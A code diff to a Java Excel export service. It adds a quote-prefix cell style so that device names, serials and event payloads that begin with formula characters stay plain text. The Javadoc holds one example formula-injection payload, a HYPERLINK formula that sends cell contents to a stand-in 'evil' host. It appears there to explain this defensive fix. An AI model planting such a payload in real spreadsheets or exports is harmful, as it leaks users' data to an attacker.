@@ -105,6 +105,7 @@ public class ExcelExportService {
     private void writeEvents(SXSSFWorkbook wb, ExportFilters f, Collection<Long> projectIds, long deadlineMillis) {
         SXSSFSheet sheet = wb.createSheet("Events");
         CellStyle header = headerStyle(wb);
+        CellStyle guard = formulaGuardStyle(wb);
         writeHeaderRow(sheet, header, "ID", "Occurred At", "Device ID", "Device",
                 "Event Type", "Priority", "Payload");
 
@@ -124,13 +125,13 @@ public class ExcelExportService {
                     from, to, projectIds, PageRequest.of(pageIdx, BATCH_SIZE));
             for (Event e : page.getContent()) {
                 Row row = sheet.createRow(rowIdx++);
-                cell(row, 0, e.getId());
-                cell(row, 1, e.getOccurredAt());
-                cell(row, 2, e.getDevice() != null ? e.getDevice().getId() : null);
-                cell(row, 3, e.getDevice() != null ? e.getDevice().getName() : null);
-                cell(row, 4, e.getEventType());
-                cell(row, 5, e.getPriority() != null ? e.getPriority().name() : null);
-                cell(row, 6, truncate(e.getPayload(), 1000));
+                cell(row, 0, e.getId(), guard);
+                cell(row, 1, e.getOccurredAt(), guard);
+                cell(row, 2, e.getDevice() != null ? e.getDevice().getId() : null, guard);
+                cell(row, 3, e.getDevice() != null ? e.getDevice().getName() : null, guard);
+                cell(row, 4, e.getEventType(), guard);
+                cell(row, 5, e.getPriority() != null ? e.getPriority().name() : null, guard);
+                cell(row, 6, truncate(e.getPayload(), 1000), guard);
             }
             if (!page.hasNext()) break;
             pageIdx++;
@@ -140,6 +141,7 @@ public class ExcelExportService {
     private void writeDevices(SXSSFWorkbook wb, ExportFilters f, Collection<Long> projectIds, long deadlineMillis) {
         SXSSFSheet sheet = wb.createSheet("Devices");
         CellStyle header = headerStyle(wb);
+        CellStyle guard = formulaGuardStyle(wb);
         writeHeaderRow(sheet, header, "ID", "Serial", "Name", "Status",
                 "Region", "Facility", "Last Heartbeat", "Content Version", "Last IP");
 
@@ -165,16 +167,16 @@ public class ExcelExportService {
                             DeviceStatusView::getId, DeviceStatusView::getComputedStatus));
             for (Device d : page.getContent()) {
                 Row row = sheet.createRow(rowIdx++);
-                cell(row, 0, d.getId());
-                cell(row, 1, d.getSerialNumber());
-                cell(row, 2, d.getName());
+                cell(row, 0, d.getId(), guard);
+                cell(row, 1, d.getSerialNumber(), guard);
+                cell(row, 2, d.getName(), guard);
                 var cs = computed.get(d.getId());
-                cell(row, 3, cs != null ? cs.name() : null);
-                cell(row, 4, d.getRegion() != null ? d.getRegion().getName() : null);
-                cell(row, 5, d.getFacility() != null ? d.getFacility().getName() : null);
-                cell(row, 6, d.getLastHeartbeatAt());
-                cell(row, 7, d.getCurrentContentVersion());
-                cell(row, 8, d.getLastKnownIp());
+                cell(row, 3, cs != null ? cs.name() : null, guard);
+                cell(row, 4, d.getRegion() != null ? d.getRegion().getName() : null, guard);
+                cell(row, 5, d.getFacility() != null ? d.getFacility().getName() : null, guard);
+                cell(row, 6, d.getLastHeartbeatAt(), guard);
+                cell(row, 7, d.getCurrentContentVersion(), guard);
+                cell(row, 8, d.getLastKnownIp(), guard);
             }
             if (!page.hasNext()) break;
             pageIdx++;
@@ -184,6 +186,7 @@ public class ExcelExportService {
     private void writeStats(SXSSFWorkbook wb, ExportFilters f, Collection<Long> projectIds, long deadlineMillis) {
         SXSSFSheet sheet = wb.createSheet("Content Stats");
         CellStyle header = headerStyle(wb);
+        CellStyle guard = formulaGuardStyle(wb);
         writeHeaderRow(sheet, header, "Content ID", "Content Name",
                 "Total Plays", "Distinct Devices");
 
@@ -205,10 +208,10 @@ public class ExcelExportService {
                             PageRequest.of(pageIdx, BATCH_SIZE));
             for (Object[] r : page.getContent()) {
                 Row row = sheet.createRow(rowIdx++);
-                cell(row, 0, (Long) r[0]);
-                cell(row, 1, (String) r[1]);
-                cell(row, 2, ((Number) r[2]).longValue());
-                cell(row, 3, ((Number) r[3]).longValue());
+                cell(row, 0, (Long) r[0], guard);
+                cell(row, 1, (String) r[1], guard);
+                cell(row, 2, ((Number) r[2]).longValue(), guard);
+                cell(row, 3, ((Number) r[3]).longValue(), guard);
             }
             if (!page.hasNext()) break;
             pageIdx++;
@@ -232,7 +235,27 @@ public class ExcelExportService {
         }
     }
 
-    private static void cell(Row row, int col, Object value) {
+    /**
+     * AUTHZ-03: the style for text that a spreadsheet would read as a formula. Device names, serials
+     * and event payloads come from devices ({@code POST /api/devices/register} needs no login), and a
+     * name like {@code =HYPERLINK("http://evil/?"&A1,"x")} is plain text in the file — but pressing
+     * F2 + Enter on it, or copying it into a CSV, turns it into a live formula. Excel's own
+     * "quote prefix" flag keeps the cell text even when edited, without changing the value (a leading
+     * {@code '} typed into the string would show up in the data). One shared style per workbook:
+     * {@code .xlsx} caps a workbook at 64,000 styles.
+     */
+    private static CellStyle formulaGuardStyle(SXSSFWorkbook wb) {
+        CellStyle style = wb.createCellStyle();
+        style.setQuotePrefixed(true);
+        return style;
+    }
+
+    /** OWASP's formula-trigger characters: {@code = + - @}, tab and carriage return. */
+    static boolean looksLikeFormula(String s) {
+        return !s.isEmpty() && "=+-@\t\r".indexOf(s.charAt(0)) >= 0;
+    }
+
+    private static void cell(Row row, int col, Object value, CellStyle formulaGuard) {
         if (value == null) return;
         Cell c = row.createCell(col);
         if (value instanceof Number n) {
@@ -240,7 +263,11 @@ public class ExcelExportService {
         } else if (value instanceof Instant i) {
             c.setCellValue(i.toString());
         } else {
-            c.setCellValue(value.toString());
+            String s = value.toString();
+            c.setCellValue(s);
+            if (looksLikeFormula(s)) {
+                c.setCellStyle(formulaGuard);
+            }
         }
     }
 
